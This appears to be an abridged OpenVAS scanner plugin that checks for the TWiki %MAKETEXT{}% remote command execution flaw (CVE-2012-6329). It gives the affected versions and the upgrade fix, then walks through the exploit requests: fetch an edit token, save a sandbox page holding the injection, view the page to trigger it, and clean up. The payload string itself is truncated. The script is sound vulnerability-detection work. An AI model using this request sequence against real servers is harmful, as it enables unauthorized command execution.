...
# $Id: gb_twiki_maketext_rce_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
...
tag_affected = "TWiki version 5.1.0 to 5.1.2, 5.0.x, 4.3.x, 4.2.x, 4.1.x, 4.0.x";
tag_insight = "flaw is due to improper validation of '%MAKETEXT{}%' Twiki variable
  (UserInterfaceInternationalisation is enabled) which is used to localize
  user interface content to a language of choice.";
tag_solution = "Upgrade to TWiki-5.1.3 or later or apply patch,
  http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2012-6329";
tag_summary = "The host is running TWiki and is prone to remote command execution
  vulnerability.";
...
if(description)
{
  ...
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/88460");
...
url1 = dir + "/do/edit" + sandbox_page + "?nowysiwyg=1";
req1 = string("GET ", url1 , " HTTP/1.1\r\n",
             ...
             "Content-Length: 0\r\n\r\n");
res1 = http_send_recv(port:twikiPort, data:req1);
...
url2 = dir + "/do/save" + sandbox_page;
post_data = string("crypttoken=", crypt_token , "&text=OpenVASTest%20%25",
...
req2 = string("POST ", url2 , " HTTP/1.1\r\n",
             ...
             post_data );
res2 = http_send_recv(port:twikiPort, data:req2);

## Execute RCE by accessing the page
url3 = dir + "/do/view" + sandbox_page;
req3 = string("GET ", url3 , " HTTP/1.1\r\n",
             ...
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: 0\r\n\r\n");
res3 = http_send_recv(port:twikiPort, data:req3);

## RCE Clenup
url4 = dir + "/do/save" + sandbox_page;
...
req4 = string("POST ", url4 , " HTTP/1.1\r\n",
             ...
             "Content-Length: ", (strlen(post_data)), "\r\n\r\n",
             post_data );
res4 = http_send_recv(port:twikiPort, data:req4);
